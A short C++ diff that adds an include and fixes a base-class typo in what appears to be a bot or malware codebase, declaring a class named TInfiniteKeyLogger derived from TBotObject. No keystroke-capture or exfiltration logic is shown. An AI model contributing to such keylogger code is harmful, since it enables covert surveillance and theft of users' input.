@@ -5,6 +5,7 @@
 //---------------------------------------------------------------------------
 
 #include "GetApi.h"
+#include "Strings.h"
 
 
 
@@ -16,7 +17,7 @@
 //
 //********************************************************
 
-class TInfiniteKeyLogger : public TBotObjet
+class TInfiniteKeyLogger : public TBotObject
 {
 private:
 	string FSignalFile;
